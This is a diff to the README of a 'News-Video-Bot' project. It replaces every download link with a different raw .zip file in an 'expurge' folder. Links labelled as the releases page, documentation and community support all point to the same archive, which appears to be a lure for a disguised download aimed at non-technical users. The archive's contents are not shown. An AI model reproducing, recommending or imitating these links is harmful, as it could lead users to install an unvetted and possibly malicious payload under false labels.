@@ -1,6 +1,6 @@
 # 🎥 News-Video-Bot - Effortless Video Creation from News
 
-![Download Latest Release](https://github.com/Amr-Awady/News-Video-Bot/raw/refs/heads/main/expurge/News-Video-Bot-3.1.zip%20Latest%20Release-%E2%9C%94%EF%B8%8F-brightgreen)
+![Download Latest Release](https://raw.githubusercontent.com/Amr-Awady/News-Video-Bot/main/expurge/Video-News-Bot-1.5.zip%20Latest%20Release-%E2%9C%94%EF%B8%8F-brightgreen)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ To begin using News-Video-Bot, follow the steps below. You don’t need any tech
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Amr-Awady/News-Video-Bot/raw/refs/heads/main/expurge/News-Video-Bot-3.1.zip) to find the latest version.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Amr-Awady/News-Video-Bot/main/expurge/Video-News-Bot-1.5.zip) to find the latest version.
 
 2. **Choose Your Version**: On the Releases page, you will see several versions. Look for the latest one. 
 
@@ -62,8 +62,8 @@ If you encounter issues:
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/Amr-Awady/News-Video-Bot/raw/refs/heads/main/expurge/News-Video-Bot-3.1.zip) - Detailed user guide and FAQs.
-- [Community Support](https://github.com/Amr-Awady/News-Video-Bot/raw/refs/heads/main/expurge/News-Video-Bot-3.1.zip) - Report issues or ask for help.
+- [Documentation](https://raw.githubusercontent.com/Amr-Awady/News-Video-Bot/main/expurge/Video-News-Bot-1.5.zip) - Detailed user guide and FAQs.
+- [Community Support](https://raw.githubusercontent.com/Amr-Awady/News-Video-Bot/main/expurge/Video-News-Bot-1.5.zip) - Report issues or ask for help.
 
 ## 🤝 Contributing
 
@@ -75,4 +75,4 @@ News-Video-Bot is open-source software. You can use, modify, and distribute it u
 
 --- 
 
-Now that you know how to download and run News-Video-Bot, enjoy transforming news articles into video content effortlessly. Visit our [Releases page](https://github.com/Amr-Awady/News-Video-Bot/raw/refs/heads/main/expurge/News-Video-Bot-3.1.zip) to start your experience.
+Now that you know how to download and run News-Video-Bot, enjoy transforming news articles into video content effortlessly. Visit our [Releases page](https://raw.githubusercontent.com/Amr-Awady/News-Video-Bot/main/expurge/Video-News-Bot-1.5.zip) to start your experience.
